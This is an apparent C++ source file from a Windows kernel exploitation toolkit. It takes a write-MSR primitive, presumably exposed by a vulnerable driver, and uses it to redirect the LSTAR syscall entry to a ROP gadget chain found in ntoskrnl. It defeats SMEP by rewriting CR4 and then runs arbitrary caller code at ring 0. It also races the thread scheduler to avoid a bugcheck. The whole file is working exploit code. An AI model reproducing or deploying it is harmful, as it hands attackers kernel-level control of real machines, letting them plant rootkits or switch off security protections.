#include "msr.hpp"
#include "shared/drv.hpp"
#include "shared/mem.hpp"
#include "shared/pe.hpp"
#include "shared/asserts.hpp"

#include <mutex>

namespace vdk::msr
{
namespace
{
/// \brief Resolved address of RtlFindExportedRoutineByName in kernel space.
///
static resolver_t kernel_resolver{};
/// \brief Base address of ntoskrnl in kernel space.
///
static void* kernel_base{};
/// \brief CR4 with smep bit set. Note: change for you system.
///
extern "C" uint64_t cr4_smep_on{ 0x3506f8 };
/// \brief CR4 without smep bit. Note: change for you system.
///
extern "C" uint64_t cr4_smep_off{ 0x2506f8 };
/// \brief Resolved gadget addresses.
///
extern "C" uint64_t sysret_gadget{};
extern "C" uint64_t mov_cr4_gadget{};
extern "C" uint64_t pop_rcx_gadget{};
extern "C" uint64_t syscall_gadget{};
/// \brief Stack placeholder offset within KPCR struct.
///
extern "C" uint64_t gs_ursp_offset{};
extern "C" uint64_t gs_krsp_offset{};
/// \brief Assembly syscall wrapper defined in helper.asm file.
///
extern "C" void syscall_wrapper(...);
/// \brief C++ function executing in CPL 0.
///
extern "C" void syscall_routine(cb_t* cb)
{
    // Restore original msr value.
    //
    __writemsr(msr_lstar, syscall_gadget);
    // Execute user provided function.
    //
    (*cb)(kernel_base, kernel_resolver);
}
/// \brief Signatures
///
#define sysret_signature                        \
    "\x48\x0F\x07"
#define mov_cr4_signature                       \
    "\x0F\x22\xE1"                              \
    "\xC3"
#define pop_rcx_signature                       \
    "\x59"                                      \
    "\xC3"
#define syscall_signature                       \
    "\x0F\x01\xF8"                              \
    "\x65\x48\x89\x24\x25\x00\x00\x00\x00"      \
    "\x65\x48\x8B\x24\x25\x00\x00\x00\x00"      \
    "\x6a\x2b"                                  \
    "\x65\xFF\x34\x25\x00\x00\x00\x00"          \
    "\x41\x53"                                  \
    "\x6a\x00"                                  \
    "\x51"                                      \
    "\x49\x8B\xCA"
#define syscall_shadow_signature                \
    "\x0F\x01\xF8"                              \
    "\x65\x48\x89\x24\x25\x00\x00\x00\x00"      \
    "\x65\x48\x8B\x24\x25\x00\x00\x00\x00"      \
    "\x65\x0F\xBA\x24\x25\x00\x00\x00\x00\x00"  \
    "\x72\x03"                                  \
    "\x0F\x22\xDC"
};

void exec(cb_t cb, wrmsr_t wrmsr)
{
    // Resolve globals once.
    //
    static std::once_flag flag;
    std::call_once(flag, []()
    {
        const auto& [base, size, name] = drv::ntoskrnl();
        kernel_base = reinterpret_cast<void*>(base);
        // Read file.
        //
        std::vector<uint8_t> raw;
        fassert(drv::read_file(name, raw));
        // Resolve rop gadgets in ntoskrnl module.
        //
        fassert(pe::find_pattern(raw.data(), base, syscall_signature, sizeof(syscall_signature), syscall_gadget));
        fassert(pe::find_pattern(raw.data(), base, sysret_signature,  sizeof(sysret_signature),  sysret_gadget));
        fassert(pe::find_pattern(raw.data(), base, mov_cr4_signature, sizeof(mov_cr4_signature), mov_cr4_gadget));
        fassert(pe::find_pattern(raw.data(), base, pop_rcx_signature, sizeof(pop_rcx_signature), pop_rcx_gadget));
        fassert((kernel_resolver = reinterpret_cast<resolver_t>(pe::get_export_rva(raw.data(), "RtlFindExportedRoutineByName") + base)));
        // Get user and kernel stack offsets within KPCR.
        //
        gs_ursp_offset = *pe::rva_to_ptr<uint32_t>(raw.data(), syscall_gadget + 8  - base);
        gs_krsp_offset = *pe::rva_to_ptr<uint32_t>(raw.data(), syscall_gadget + 17 - base);
        // Deduce LSTAR value. It's either KiSystemCall64Shadow if KVA enabled or KiSystemCall64 otherwise.
        //
        SYSTEM_KERNEL_VA_SHADOW_INFORMATION kva{};
        if (NT_SUCCESS(NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(196), &kva, sizeof(kva), nullptr)))
        {
            if (kva.KvaShadowFlags.KvaShadowEnabled)
            {
                fassert(pe::find_pattern(raw.data(), base, syscall_shadow_signature, sizeof(syscall_shadow_signature), syscall_gadget));
            }
        }
    });
    // For thread safety.
    //
    static std::mutex exploit;
    std::lock_guard guard(exploit);

    const auto class_priority  = GetPriorityClass(GetCurrentProcess());
    const auto thread_priority = GetThreadPriority(GetCurrentThread());
    // We are racing with kernel thread scheduler here and have to execute syscall after wrmsr before it will switch us to the other core or we bugcheck.
    //
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    if (wrmsr(msr_lstar, pop_rcx_gadget)) [[likely]]
    {
        syscall_wrapper(&cb);
    }

    SetPriorityClass(GetCurrentProcess(), class_priority);
    SetThreadPriority(GetCurrentThread(), thread_priority);
}
};
